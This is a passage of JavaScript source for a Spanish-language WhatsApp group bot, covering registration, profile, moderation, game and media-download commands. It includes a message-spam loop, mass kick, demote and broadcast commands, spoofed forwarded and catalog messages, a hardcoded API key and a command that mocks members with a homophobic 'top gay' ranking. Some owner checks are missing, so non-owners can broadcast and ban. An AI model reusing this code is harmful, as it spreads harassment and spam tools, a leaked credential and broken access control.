function _0x2ebb(){const _0x1f3a36=['596272DpXnFJ','3014956bQCwYI','305JopJQj','random','2228ohmCxL','length','536emrlcz','10PFFhRj','58842aSBvqN','43842MEaDFW','9503252VrVLos','967866wYoLpq','floor','786TgYlYm'];_0x2ebb=function(){return _0x1f3a36;};return _0x2ebb();}const _0x30a7da=_0x5a02;function _0x5a02(_0x53b46b,_0x2e0f92){const _0x2ebb0e=_0x2ebb();return _0x5a02=function(_0x5a027e,_0x5d59a6){_0x5a027e=_0x5a027e-0x192;let _0x4492c1=_0x2ebb0e[_0x5a027e];return _0x4492c1;},_0x5a02(_0x53b46b,_0x2e0f92);}(function(_0x21bf49,_0x2c895d){const _0x4774dd=_0x5a02,_0x36356f=_0x21bf49();while(!![]){try{const _0x3b0a2f=-parseInt(_0x4774dd(0x19a))/0x1+-parseInt(_0x4774dd(0x197))/0x2+-parseInt(_0x4774dd(0x199))/0x3*(-parseInt(_0x4774dd(0x19e))/0x4)+parseInt(_0x4774dd(0x19c))/0x5*(parseInt(_0x4774dd(0x195))/0x6)+parseInt(_0x4774dd(0x19b))/0x7+-parseInt(_0x4774dd(0x192))/0x8*(parseInt(_0x4774dd(0x194))/0x9)+parseInt(_0x4774dd(0x193))/0xa*(parseInt(_0x4774dd(0x196))/0xb);if(_0x3b0a2f===_0x2c895d)break;else _0x36356f['push'](_0x36356f['shift']());}catch(_0x570495){_0x36356f['push'](_0x36356f['shift']());}}}(_0x2ebb,0x59db2));const n1='1',n2='2',n3='3',n4='4',n5='5',n6='6',n7='7',n8='8',n9='9',n0='0',N1=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],h1=N1[Math[_0x30a7da(0x198)](Math['random']()*N1[_0x30a7da(0x19f)])],N2=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],e1=N2[Math[_0x30a7da(0x198)](Math[_0x30a7da(0x19d)]()*N2[_0x30a7da(0x19f)])],N3=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],ee=N3[Math[_0x30a7da(0x198)](Math['random']()*N3[_0x30a7da(0x19f)])],N4=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],c=N4[Math[_0x30a7da(0x198)](Math['random']()*N4[_0x30a7da(0x19f)])],N5=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],h=N5[Math['floor'](Math[_0x30a7da(0x19d)]()*N5['length'])],N6=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],o=N6[Math['floor'](Math[_0x30a7da(0x19d)]()*N6[_0x30a7da(0x19f)])],N7=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],u=N7[Math[_0x30a7da(0x198)](Math[_0x30a7da(0x19d)]()*N7[_0x30a7da(0x19f)])],N8=[''+n1,''+n2,''+n3,''+n4,''+n5,''+n6,''+n7,''+n8,''+n9,''+n0],t=N8[Math[_0x30a7da(0x198)](Math[_0x30a7da(0x19d)]()*N8[_0x30a7da(0x19f)])],N9=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','Ñ','O','P','Q','R','S','T','U','V','W','X','Y','Z'],e=N9[Math[_0x30a7da(0x198)](Math[_0x30a7da(0x19d)]()*N9[_0x30a7da(0x19f)])],DNI=''+h1+e1+ee+c+h+o+u+t+e;
try {
    ppimg = await leo.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
    } 
    catch {
    ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'
    }
    veri = sender                                                
addRegisteredUser(sender, pushname, nombre, edad, time, serialUser)
txtt = `┌────「 *REGISTRADO* 」─
[💈] *USER*: @${sender.split("@")[0]}
[💈] *NOMBRE* _${nombre}_
[💈] *EDAD* _${edad}_
[💈] *HORA* _${time}_
[💈] *DNI* _${DNI}_
[💈] *SERIAL* _${serialUser}_
└────「 *𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊* 」
Verificación completa usa *${prefix}menu* para ver el Menu`
    let tampa = await getBuffer(ppimg)
    //leo.sendMessage(from, tampa, image, {quoted: choute, caption: capt})
    buttons1 = [ {buttonId:`mlq`,buttonText:{displayText: 'Lista de Menus'},type:1},
    {buttonId:`sex`,buttonText:{displayText:'Como Tener Este Bot'},type:1}],
    imageMsg = (await leo.prepareMessageMedia((tampa), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
    buttonsMessage = {
    contentText: `${txtt}`,
    footerText: `Total de Registrados: ${_registered.length}\nCreador ${yo}}\nSi no ves los botones, escribe ${prefix}botones, para que te aparezca la soluccion.`, imageMessage: imageMsg,
    buttons: buttons1,
    headerType: 4}
    prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })
    leo.relayWAMessage(prep)
    break 

case 'yo':
case 'itsme':
case 'miperfil':
                try {
                ppimg = await leo.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                } catch {
                ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'}
                tu = await leo.getStatus(`${sender.split('@')[0]}@c.us`, MessageType.text)
teks = 
`👤 *Nombre* : @${sender.split("@")[0]}
☎️ *Número* : ${sender.split("@")[0]}
🌐 *Link* : wa.me/${sender.split("@")[0]}
🗣️ *Tipo de Usuario* : ${tipoDeUsr}
⚙️ *Nivel* : ${getLevel1}
🎖️ *Rango* : ${rango}
📋 *INFO:* ${tu.status}`
                its = await getBuffer (ppimg)
                leo.sendMessage(from,  its, image,  {thumbnail:fs.readFileSync('./media/imagen/Faketumber.jpg'), quoted: choute, caption: teks, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
                {"title": 'Sigueme en Youtube',       
                "body": 'Subcribete Te Podria Interesar',  
                "thumbnail": its,
                "sourceUrl": 'https://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1'}}})
                break

case 'level':
case 'nivel':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            leo.sendMessage(from,  `${nivel}`, MessageType.text, {quoted: choute, contextInfo: { mentionedJid: [sender]}})
            break

case 'wa.me':
case 'wame':  
                if (!isRegister) return leoply(baby.only.usrReg)
                if (isBan) return leoply  (baby.only.benned)	  
                if (args.length < 1) return reply('Escribe el numero del usuario para general el link, mencionalo o etiqueta un mensaje de el')
                try {
                ppimg = await leo.getProfilePicture(`${mentionUser.split('@')[0]}@c.us`)
                } catch {
                ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'
                }
                its = await getBuffer (ppimg)
                leo.sendMessage(from, 
                `Link de WhatsApp`+ args.join(' '), text,  {quoted: choute, caption: teks, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
                {"title": 'Sigueme en Instagram',       
                "body": 'Subcribete Te Podria Interesar',  
                "thumbnail": its,
                "sourceUrl": 'https://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1'}}})
                break

case 'catalogo':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!q.includes('|')) return  reply(`Mal, ejemplo de uso \n${prefix}catalogo Texto|007`)
            const name = q.substring(0, q.indexOf('|') - 0)
            const cantidad = q.substring(q.lastIndexOf('|') + 1)
            try {
            ppimg = await leo.getProfilePicture(`${sender.split('@')[0]}@c.us`)
            } catch {
            ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'}
            ft = await getBuffer (ppimg)
            fansh = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": `${cantidad}`, "totalAmount1000" : '1000', "message": `${name}\n\n\nCreador is 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail": ft, "surface": 'CATALOG', "orderTitle": 'Sexo'}}, {contextInfo: { mentionedJid: [sender]}, quoted:choute, })
            leo.relayWAMessage(fansh)
            break

case 'milink':
case 'miwame':  
          if (!isRegister) return leoply(baby.only.usrReg)
          if (isBan) return leoply  (baby.only.benned)	  
          //if (args.length < 1) return reply('Y el numero?')
          try {
            ppimg = await leo.getProfilePicture(`${sender.split('@')[0]}@c.us`)
            } catch {
            ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'
            }
            its = await getBuffer (ppimg)

          leo.sendMessage(from, 
`Link de WhatsApp wa.me/${sender.split('@')[0]}`, text,  {quoted: choute, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
{"title": `${pushname}`,       
"body": '© 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊',  
"thumbnail": its,
"sourceUrl": `https://api.whatsapp.com/send/?phone=${sender.split('@')[0]}`}}})             
 break 

case 'instalar':
case 'instalacion':
leo.sendMessage(from, `${install}`, MessageType.text, {quoted: choute,  contextInfo: {"forwardingScore": 508, "externalAdReply": 
    {"title": `Hola ${pushname} 👋🏻`, 
    "body": `MIRA EL VIDEO COMPLETO`, "mediaType": 2, 
    "thumbnail": fs.readFileSync(`media/imagen/youtube-min.jpg`), 
    mediaUrl: "https://www.youtube.com/watch?v=Uv8U9VChJHo&t"}}})  

//COMANDOS SOLO DISPONIBLES PARA EL DUEÑO DEL BOT

case 'antipv':
  if (!isOwner) return leoply(baby.only.ownerB)
  if (body.includes('on')){
if (isAntiPv) return reply (`Ya estaba activado`)
antipv.push('online')
fs.writeFileSync('./src/antipv.json', JSON.stringify(antipv))
reply(`Activado`);
} else if (body.includes('off')){
if (!isAntiPv) return reply (`Ya esta desactivado`)
antipv.splice('online')
fs.writeFileSync('./src/antipv.json', JSON.stringify(antipv))
reply (`Desactivado`);
} else {
reply (`${prefix}antipv on/off`)
}
break




case 'mtp':
case 'multiprefijo':
case 'multiprefix':
                    if (isBan) return leoply  (baby.only.benned)
                    if (!isGroup) return leoply(baby.only.group)
                    if (!isAdmin) return leoply(baby.only.admin)
                    if (!botAdmin) return leoply (baby.only.Badmin)                    
                    if (args.length < 1) return reply('Escribe on para activar')
                    if ((args[0]) === 'on') {
                    if (isMultiPrefix) return reply('Ya está activo')
                    multiprefix.push(from)
                    fs.writeFileSync('./src/multiprefix.json', JSON.stringify(multiprefix)) 
                    reply('Multiprefijos Activado Exitosamente')} 
                    else if ((args[0]) === 'off') { 
                    if (!isMultiPrefix) return reply('El antilink ha sido desactivado exitosamente del grupo.')
                    var ini = multiprefix.indexOf(from)
                    multiprefix.splice(ini, 1)
                    fs.writeFileSync('./src/multiprefix.json', JSON.stringify(multiprefix))
                    reply('Desactivar con éxito ✔️')
                    } else {reply('Escribe on para activar o off para desactivar')}
                    break


/*

case 'sinprefijo':
case 'noprefix':
                prefix = ''
                reply('Ahora no es necesario colocar ningun prefijo para ejecutar algun comando')
                break

case 'setprefix':
case 'nuevoprefix':
                if (!itsMe) return reply(baby.only.ownerB)
                prefix = q
                reply(`El prefix se cambió con exito a : ${q}`)
                break 
*/
case 'apagar':
case 'off':
case 'pw':
              if (!isOwner) return leoply(baby.only.ownerB)
              reply('Deja me apago al toque mi king')
              setTimeout( () => {
              leo.close() }, 3000)
              break
case 't2':
case 'setthumb':
              if (!itsMe) return reply(baby.only.ownerB)
	            if ((isMedia && !choute.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	  const tumb = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo : choute
			        del = await leo.downloadMediaMessage(tumb)
			        fs.writeFileSync(`./media/imagen/Faketumber.jpg`, del)
			        reply('Con exito')
        	    } else {
              reply(`Responde a una foto`)}
			        break	



case 'publico':
              if (!isOwner) return leoply(baby.only.ownerB)
              if (public) return reply('*El modo publico Ya esta activado*')
              config["public"] = true
              public = true
              fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
              wa.FakeTokoForwarded(from, "*Se activo el modo publico*", "Public : true")
              break
              
case 'privado':
case 'self':
              if (!isOwner) return leoply(baby.only.ownerB)
              if (!public) return reply('El modo privado ya estaba activado')
              config["public"] = false
              public = false
              fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
              await wa.fakeStatusForwarded(from, "*Se a cambiado a modo PRIVADO*", "Self : true")
              break

case 'salir':
              if (!isOwner && !itsMe) return await reply(baby.only.ownerB)
              if (!isGroup) return await reply(baby.only.group)
              reply(`Saldre de este grupo: ${groupName} en 3 segundos`).then(async() => {
              await help.sleep(3000)
              await leo.groupLeave(from)})
              break

case 'anuncio':
case 'bc':
            if (!isOwner) 
            if (args.length < 1) return reply('.......')
            const more = String.fromCharCode(8206)
            const readmore = more.repeat(4001)
            anu = await leo.chats.all()
            if (isMedia && !choute.message.videoMessage || isQuotedImage) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo : choute
            bc = await leo.downloadMediaMessage(encmedia)
            for (let _ of anu) {
            leo.sendMessage(_.jid, bc, image, {caption: `${body.slice(4)}\n*NOTIFICACION*`, sendEphemeral: true})
            }
            reply('con éxito')
            } else {
            for (let _ of anu) {
            sendMess(_.jid,`${body.slice(4)}` + readmore + `\n*ANUNCIO DADO*`)
            }
            reply('con éxito')}
            break

case 'spam':
            if (!isOwner) return leoply('Este comando solo puede der utilizado por mi')
            if (!arg) return reply(`Escribe la palabra y el número de veces a mandar`)
            argz = arg.split("|")
            if (!argz) return reply(`Escribe la palabra y el número de veces a mandar`)
            if (isNaN(argz[1])) return reply(`harus berupa angka`)
            for (let i = 0; i < argz[1]; i++){
            leo.sendMessage(from, argz[0], MessageType.text, {sendEphemeral: true})}
            break

case 'banchat':
              if (!itsMe) return reply('🤔')
              if (args.length < 1) return reply('Escribe on para activar y off para desactivar')
              if (body.endsWith('on')) {
              if (isBanChat) return reply('Este chat ya ah estado baneado!')
              chatban.push(from)
              fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
              reply('*♻Este chat a sido baneado*')
              } else if (body.endsWith('off')) {
              chatban.splice(from)
              fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
              reply('*♻Este chat a dejado de ser baneado*')
              } else {
              reply(`Porfavor escriba bien el comando: ${prefix}banchat *on/off*`)}
              break

case 'ban':
                if (!isOwner) 
                mentionUser = choute.message.extendedTextmessage.contextInfo.mentionedJid
                if (mentionUser.length !== 0){
                for (let i = 0; i < mentionUser.length; i++){
                addBanned(mentionUser[0], args[1], ban)}
                (`@${mentionUser[0].split('@')[0]} Estas baneado no podes usar el bot :D1`, mentionUser, true)
                       
                isbans =`@${mentionUser[0].split('@')[0]} Haz sido *_Baneado_* ya no puedes usar el bot`, mentionUser, true
                        buttons1 = [{buttonId:`owner`,buttonText:{displayText: 'Owner'},type:1},]
                imageMsg = (await leo.prepareMessageMedia(fs.readFileSync(`./media/imagen/ban.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
                buttonsMessage = {
                contentText: `${isbans}`,
                footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
                buttons: buttons1,
                headerType: 4}} 
                else if (isQuotedMsg) {if (quotedMsg.sender.match('18299897014')) return reply(`🤨`)
                addBanned(quotedMsg.sender, args[1], ban)
                mentions(`@${mentionUser[0].split('@')[0]} Estas baneado no podes usar el bot :D2`, mentionUser, true)} 
                else if (!isNaN(args[1])) {addBanned(args[1] + '@s.whatsapp.net', args[2], ban)
                mentions(`@${mentionUser[0].split('@')[0]} Estas baneado no podes usar el bot :D3`, mentionUser, true)}
                bane = leo.prepareMessageFromContent(from, {buttonsMessage}, {quoted: choute, contextInfo: {mentionedJid: [mentionUser]}})
                leo.relayWAMessage(bane)
                break

case 'unban':
case 'desban':
          if (!isOwner) return leoply(baby.only.ownerB)
          mentionUser = choute.message.extendedTextMessage.contextInfo.mentionedJid
                  if (mentionUser.length !== 0){
                  for (let i = 0; i < mentionUser.length; i++){
                  unBanned(mentionUser[i], ban)
                  }
                  mentions(`@${mentionUser[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentionUser, true)
                  }if (isQuotedMsg) {
                  unBanned(quotedMsg.sender, ban)
                  mentions(`@${mentionUser[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentionUser, true)
                  } else if (!isNaN(args[0])) {
                  unBanned(args[0] + '@s.whatsapp.net', ban)
                  mentions(`@${mentionUser[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentionUser, true)
                  }
                  break
                
case 'demoteall':
          if (!isOwner) return leoply(baby.only.ownerB)
          if (!isGroup) return leoply(baby.only.group)
          if (!botAdmin) return leoply (baby.only.Badmin)
          members_id = []
          for (let mem of groupMembers) {
          members_id.push(mem.jid)
          }
          leo.groupDemoteAdmin(from, members_id)
          break

case 'promoteall':
          if (!isOwner && !choute.key.fromMe) return reply(baby.only.ownerB)
          if (!isGroup) return leoply(baby.only.group)
          if (!botAdmin) return leoply (baby.only.Badmin)
          members_id = []
          for (let mem of groupMembers) {
          members_id.push(mem.jid)
          }
          leo.groupMakeAdmin(from, members_id)
          break

case 'fullkick':
case 'kickall':

            if (!isOwner) return leoply(baby.only.ownerB)
            if (!isGroup) return leoply(baby.only.group)
            if (!botAdmin) return leoply (baby.only.Badmin)
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
leo.groupRemove(from, members_id)
break

            
case 'blocklist':
case 'listblock':
					  teks = 'Lista de Bloqueados:\n'
					  for (let block of blocked) {
						teks += `┣❥  @${block.split('@')[0]}\n`}
					  teks += `Total : ${blocked.length}`
					  leo.sendMessage(from, teks.trim(), extendedText, {quoted: choute, contextInfo: {"mentionedJid": blocked}})
					  break

case 'desfijar':
            if (!itsMe) return reply(baby.only.ownerB)
            leo.modifyChat(from, ChatModification.unpin)
            reply('*succes unpin this chat*')
            console.log('unpin chat = ' + from)
            break

case 'fijar':
              if (!itsMe) return reply(baby.only.ownerB)
              leo.modifyChat(from, ChatModification.pin)
              reply('*Este chat se ah fijado*')
              console.log('Se fijo el chat = ' + from)
              break

case 'sinleer':
              leo.sendMessage(from, `Total de mensajes sin leer: ${unread.length}`, MessageType.text)
              break

case 'desarchivar':
              if (!itsMe) return reply(baby.only.ownerB)
              reply('*Todos los chats archivados fueron desarchivados*')
              console.log('succes unarchive chat = ' + from)
              anu = await leo.chats.all()
              for (let _ of anu) {
              leo.modifyChat(_.jid, ChatModification.unarchive)}
              break

case 'archivar':
              if (!itsMe) return reply(baby.only.ownerB)
              reply('*Voy*')
              console.log('succes archive chat = ' + from)
              await sleep(3000)
              leo.modifyChat(from, ChatModification.archive)
              reply('*Todos los Chat Fueron Archhivados*')
              break

case 'vaciartodo':
              if (!itsMe) return reply(baby.only.ownerB)
              reply('*Todos los chats han sido vaciados*')
              jyc = await leo.chats.all()
              for (let _ of jyc) {
              await sleep(4000)
              leo.modifyChat(_.jid, ChatModification.delete)}
              break

case 'vaci':
              if (!isOwner) return leoply(baby.only.ownerB)
              reply('*Todos los chats han sido vaciados*')
              jyc = await leo.chats.all()
              for (let _ of jyc) {
              await sleep(4000)
              leo.modifyChat(_.jid, ChatModification.delete)}
              break

case 'vaciar':
              if (!itsMe) return reply(baby.only.ownerB)
              reply('*Este chat a sido vaciado*')
              console.log('succes delete chat = ' + from)
              await sleep(4000)
              leo.modifyChat(from, ChatModification.delete)
              break

case 'silencio':
              if (!itsMe) return reply(baby.only.ownerB)
              leo.modifyChat(from, ChatModification.mute, 24*60*60*1000)
              reply('*Este chat a sido silenciado*')
              console.log('succes mute chat = ' + from)
              break

case 'desilenciar':
              if (!itsMe) return reply(baby.only.ownerB)
              leo.modifyChat(from, ChatModification.unmute)
              reply('*Este chat a dejado de silenciarse*')
              console.log('succes unmute chat = ' + from)
              break


//JUEGOS | ENTRETENIMIENTO 
case 'vor':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            txtt =`*𝗩𝗘𝗥𝗗𝗔𝗗 𝗢 𝗥𝗘𝗧𝗢*\n𝗩𝗘𝗥𝗗𝗔𝗗: .v r\n𝗥𝗘𝗧𝗢: .r v`
            buttons1 = [{buttonId:`verdad`,buttonText:{displayText: 'Verdad'},type:1},
                        {buttonId:`reto`,buttonText:{displayText: 'Reto'},type:1}]
            imageMsg = (await leo.prepareMessageMedia(fs.readFileSync(`./media/imagen/vor.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
            buttonsMessage = {
            contentText: `${txtt}`,
            footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
            buttons: buttons1,
            headerType: 4} 
            prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute })
            leo.relayWAMessage(prep)              
            break

case 'chiste':
            if (isBan) return leoply  (baby.only.benned)	
            if (!isRegister) return leoply(baby.only.usrReg)
            respuesta = [`¿Cuál es el colmo de un ciego?\n Enamorarse a primera vista.`, `*¿Qué le dijo un zapato a otro?* \n - Qué vida más arrastrada llevas. \n ¡MIRA LOS ZAPATOS QUE EXISTEN PARA ANDAR POR EL TECHO!`, `¿Qué le dijo un cable a otro cable? \n Somos los intocables.`, `*¿Qué le dijo batman al papel higiénico?* \n Tu eres el único que conoce mi baticueva.`, `¿Por qué llora un libro de matemáticas? \n ¡Porque tiene muchos problemas!`, `¿Qué está al final de todo? ¡La letra o!`, `¿Por qué el profe de música tiene una escalera? \n ¡Para poder llegar a las notas más altas!`, `¿Qué le dice una iguana a su hermana gemela? \n Somos iguanitas`, `*¿Cuál es el colmo del electricista?* \n ¡Que su mujer se llame Luz!`, `¿Cómo se dice pañuelo en japonés? \n Sacamoko`, `¿Cuál es el pez que huele mucho? \n ¡Peztoso!`, `¿Sabes cómo se queda un mago después de comer? \n Magordito` ]
            answer = respuesta[Math.floor(Math.random() * respuesta.length)]
            reply(answer)
            addFilter(from)
            break

case 'top5':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	
              addFilter(from)
          if (!isGroup) return reply('Top5 en un chat? Te gusta la pija cierto. Este comando es solo para grupos.')
          member = []
          top5 = args.join(' ')
          const p1 = groupMembers
          const p2 = groupMembers
          const p3 = groupMembers
          const p4 = groupMembers
          const p5 = groupMembers
          const o1 = p1[Math.floor(Math.random() * p1.length)]
          const o2 = p2[Math.floor(Math.random() * p2.length)]
          const o3 = p3[Math.floor(Math.random() * p3.length)]
          const o4 = p4[Math.floor(Math.random() * p4.length)]
          const o5 = p5[Math.floor(Math.random() * p5.length)]
          teks = `
*Atencion estos son los 5*\n\n *Primer puesto para* @${o1.jid.split('@')[0]}\n\n*Segundo puesto para*@${o2.jid.split('@')[0]}\n\n*Tercer puesto para*@${o3.jid.split('@')[0]}\n\n*Cuarto puesto para* @${o4.jid.split('@')[0]}\n\n*Quinto puesto para* @${o5.jid.split('@')[0]}\n\n\n_Top 5 de_ *${top5}* en este grupo`
member.push(o1.jid)
member.push(o2.jid)
member.push(o3.jid)
member.push(o4.jid)
member.push(o5.jid)
mentions(teks, member, true)
break

case 'topgay':
case 'rankgay':
case 'rangay':

              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	
              addFilter(from)
              if (!isGroup) return reply('Top5 en un chat? Te gusta la pija cierto. Este comando es solo para grupos.')
              member = []
              teks = `
**️‍🌈Top 🏳️‍🌈5 LGTB🏳️‍🌈 ️del Grupo️‍🌈*\n\n *🏳️‍🌈1-* @${o1.jid.split('@')[0]}\n\n*🏳️‍🌈2-*@${o2.jid.split('@')[0]}\n\n*🏳️‍🌈3-*@${o3.jid.split('@')[0]}\n\n*🏳️‍🌈4-* @${o4.jid.split('@')[0]}\n\n*🏳️‍🌈5-* @${o5.jid.split('@')[0]}`
member.push(o1.jid)
member.push(o2.jid)
member.push(o3.jid)
member.push(o4.jid)
member.push(o5.jid)
mentions(teks, member, true)
break

case 'pregunta':
                  if (!isRegister) return leoply(baby.only.usrReg)
                  if (isBan) return leoply  (baby.only.benned)	
                  respuesta = ['Si', 'No', 'Tal vez', 'Puede ser', 'Ai una probabilidad del 99.99999999991.01%', 'Puede que no', 'Yo que se', 'mmmm🤔.... Dejame lo pienso un poco']
                  answer = respuesta[Math.floor(Math.random() * respuesta.length)]
                  if (!q) return reply('Y la pregunta?')
                  reply(answer)
                  addFilter(from)
                  break
 /*
case 'casino':
case 'cassino':
a = '😳'
b = '😬'
c = '💩'
e = '🤠'
f = '🤡'
g = '😈'
pw = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck = pw[Math.floor(Math.random() * pw.length)]
pw1 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck1 = pw1[Math.floor(Math.random() * pw1.length)]
pw2 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck2 = pw2[Math.floor(Math.random() * pw2.length)]
pw3 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck3 = pw3[Math.floor(Math.random() * pw3.length)]
pw4 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck4 = pw4[Math.floor(Math.random() * pw4.length)]
pw5 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck5 = pw5[Math.floor(Math.random() * pw5.length)]
pw6 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck6 = pw6[Math.floor(Math.random() * pw6.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
j = `┃ │  ${luck} │  ${luck1} │${luck2}`
o = `┃ │  ${luck3} │  ${luck4} │${luck5}`
y = `┃ │  ${luck6} │  ${luck7} │${luck7}`
a = `
╭──╼┥ *CASSINO*  ┝╾╮
╽ ┌──────────┐  ┃
${j}
┃ ├──────────┤  ┃
${o}
┃ ├──────────┤  ┃
${y}
╿ └──────────┘  ╿
╰─┨ *BIENVENIDOS* ┠─╯`
reply(`${a}`)
break
*/
  



//DESCARGAS | MULTIMEDIA
case 'mfire':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	
              if (args.length < 1) return reply('y el link?? ')
              if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Link invalido, el link debe ser de MediaFire')
              reply('Pera dame un segundo')
teks = args.join(' ')
const resm = await babyfire(teks)
archivo = `  「  ${yo} 」
*Nombre :* ${resm[0].nombre}
*Tamaño :* ${resm[0].size}
*Link :* ${resm[0].link}
_*El Archivo Se Enviara En Un Momento*_`
reply(archivo)
sendFileFromUrl(resm[0].link, document, {mimetype: resm[0].mime, filename: resm[0].nombre, quoted: choute})
addFilter(from)
break

case 'play':
if (!q) return reply(`_Escribe lo que quieres buscar_`)
reply(`Espere un momento, su audio ${q} se esta descargando...`)
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res1 = await yts(q).catch(e => {	
reply('*NO HE ENCONTRADO LO QUE BUSCABAS*')
})	
let thumbInfo = ` [ *${res1.all[0].title}* ]
*Subido* ${res1.all[0].ago}
*Vistas :* ${res1.all[0].views}
*Duracion :* ${res1.all[0].timestamp}
*Canal :* ${res1.all[0].author.name}
*°Link del Canal :* ${res1.all[0].author.url}
*Elaudio se esta enviando*
No hagas spam del comando_` 
sendFileFromUrl(res1.all[0].image, image, {quoted: choute, sendEphemeral: true, caption: thumbInfo, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
res1 = await y2mateA(res1.all[0].url).catch(e => {
pr21 = getJson(`https://api.zeks.xyz/api/ytmp3?apikey=hamilton20&url=${res1.all[0].url}`)	
reply(`_*[ ! ]* Lo siento, su descarga no pudo ser completada_\n\n*Realizando busqueda en el servidor 2*`)
sendFileFromUrl(pr21.result.url_audio, audio, {quoted: choute, mimetype: 'audio/mp4', filename: res1[0].output})
})
sendFileFromUrl(res1[0].link, audio, {quoted: choute, mimetype: 'audio/mp4', filename: res1[0].output})}
addFilter(from)
break


case 'ytmp4':
                if (!isRegister) return leoply(baby.only.usrReg)
                if (isBan) return leoply  (baby.only.benned)	
                if (args.length < 1) return reply('Y el link?')
                if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Eu debes de darme el link de *YOUTUBE*')
                teks = args.join(' ')
                reply(baby.wait)
                resyv = await y2mateV(teks).catch(e => {
                reply('_ERROR :D, intentalo _')
                })
                result = `「  ${yo} 」
*°Titulo :* ${resyv[0].judul}
*°Tamaño :* ${resyv[0].size}
*°Calidad :* ${resyv[0].quality}p
*°Nombre :* ${resyv[0].output}
*°Output :* ${resyv[0].tipe}
_*El archivo se esta enviando.*_
                `
                sendFileFromUrl(resyv[0].thumb, image, {caption: result, quoted: choute})
                sendFileFromUrl(resyv[0].link, video, {quoted: choute, mimetype:'video/mp4', duration: 9999999999})
                addFilter(from)
                addLevelingLevel(sender, 5)		
                break
